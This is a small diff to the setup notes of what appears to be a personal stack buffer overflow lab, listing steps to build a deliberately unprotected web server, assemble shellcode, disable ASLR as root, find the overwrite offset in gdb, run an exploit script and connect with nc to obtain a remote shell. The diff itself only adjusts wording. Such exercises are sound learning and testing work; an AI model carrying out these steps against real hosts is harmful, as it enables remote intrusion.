@@ -1,13 +1,13 @@
 Making this stuff work:
  - gcc -g -o web_server web_server.c -fno-stack-protector -z execstack
  - nasm shell_code_64.s
-    - this is completely PI, but to test it out just assemble with "nasm -f elf64 <FILE>; ld <FILE>"
- - as root, echo 0 > /proc/sys/kernel/randomize-va-space
+    --> this is completely PI, but to test it out just assemble with "nasm -f elf64 <FILE>; ld <FILE>"
+ - In order to disable ASLR run, as root, "echo 0 > /proc/sys/kernel/randomize-va-space"
  - finding the offset:
     --> the offset is just the difference between the address of the buffer and the location on the stack of the return address that you want to overwrite (main, in this case)
     --> In gdb you can use bt to find the main address. Then you can do "find /g "stack pointer", +1000, "main address". Then you simply subtract the buffer address from this value.
  - finding the return address:
-    --> I'm simply using the buffer address plus some wiggle room
+    --> I'm simply using the buffer address plus some wiggle room.
  - run the exploit with "python fuckitup.py <HOST> $(cat shell_code_64) <OFFSET> RETURN ADDRESS>"
  - after executing the exploit run "nc <HOST> <PORT>" to actually pop the shell
 
